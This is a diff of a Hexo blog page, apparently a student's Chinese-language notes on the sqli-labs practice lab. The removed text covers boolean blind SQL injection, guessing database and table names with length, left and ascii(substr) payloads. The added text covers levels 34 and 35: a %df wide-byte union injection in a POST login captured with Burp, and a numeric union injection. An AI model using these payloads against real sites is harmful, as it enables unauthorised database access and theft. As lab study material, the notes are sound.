@@ -5,17 +5,17 @@
   
 
   
-  <title>盲注 | Hexo</title>
+  <title>sqlilabs 34 35 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="?id&#x3D;1’ and length(database())&#x3D;n %23 n从0到无穷大 猜出数据库长度  ?id&#x3D;1’ and left(database(),1)&gt;’a‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）  利用substr() ascii()函数进行尝试">
+  <meta name="description" content="a这关和上面一样只不过get变成post 那就用burp  先随便输一个username 和password 抓包 改包 uname&#x3D;aaa&amp;passwd&#x3D;aaa&amp;submit&#x3D;Submit 对这一串进行更改 uname&#x3D;aaa%df’ union select 1,database（） –+&amp;passwd&#x3D;aaa&amp;submit&#x3D;Submit  还是需要打上%df">
 <meta property="og:type" content="article">
-<meta property="og:title" content="盲注">
-<meta property="og:url" content="http://example.com/2020/11/25/page-5/index.html">
+<meta property="og:title" content="sqlilabs 34 35">
+<meta property="og:url" content="http://example.com/2021/02/08/page-25/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="?id&#x3D;1’ and length(database())&#x3D;n %23 n从0到无穷大 猜出数据库长度  ?id&#x3D;1’ and left(database(),1)&gt;’a‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）  利用substr() ascii()函数进行尝试">
+<meta property="og:description" content="a这关和上面一样只不过get变成post 那就用burp  先随便输一个username 和password 抓包 改包 uname&#x3D;aaa&amp;passwd&#x3D;aaa&amp;submit&#x3D;Submit 对这一串进行更改 uname&#x3D;aaa%df’ union select 1,database（） –+&amp;passwd&#x3D;aaa&amp;submit&#x3D;Submit  还是需要打上%df">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-11-25T12:28:10.000Z">
-<meta property="article:modified_time" content="2020-11-25T12:28:25.830Z">
+<meta property="article:published_time" content="2021-02-08T08:28:59.000Z">
+<meta property="article:modified_time" content="2021-02-08T08:39:40.879Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -66,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-page-5" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-page-25" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/25/page-5/" class="article-date">
-  <time datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+    <a href="/2021/02/08/page-25/" class="article-date">
+  <time datetime="2021-02-08T08:28:59.000Z" itemprop="datePublished">2021-02-08</time>
 </a>
     
   </div>
@@ -80,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      盲注
+      sqlilabs 34 35
     </h1>
   
 
@@ -88,17 +88,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
-<p>?id=1’ and left(database(),1)&gt;’<strong><em>a</em></strong>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
-<ul>
-<li>利用substr() ascii()函数进行尝试</li>
-</ul>
-<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<strong><em>1</em></strong>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+        <p>a这关和上面一样只不过get变成post 那就用burp </p>
+<p>先随便输一个username 和password 抓包 改包</p>
+<p>uname=aaa&amp;passwd=aaa&amp;submit=Submit 对这一串进行更改</p>
+<p>uname=aaa%df’ union select 1,database（） –+&amp;passwd=aaa&amp;submit=Submit  还是需要打上%df 就可以了 </p>
+<p>之后还是那套组合拳 </p>
+<p>group_concat(table_name) from information_schema.tables where table_schema=’database()’ –+</p>
+<p>35和34 凑一凑吧 毕竟35真的不多的内容 </p>
+<p>这关就是数字型注入了那么反斜杠的过滤就没用了 直接?id=1 union select 1,2,3 –+ 然后就是标准组合拳</p>
+<p>一套下来 就可以了</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckhxdwgkq0000x0v76f1pa6wz" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/08/page-25/" data-id="ckkwc20gp0001iwv701xc1bwh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -107,19 +110,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/20/page-8/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          page less 11-20
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/11/19/page-4/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/08/page-24/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sqli-labs</div>
+      <div class="article-nav-title">sqlilabs 32 33</div>
     </a>
   
 </nav>
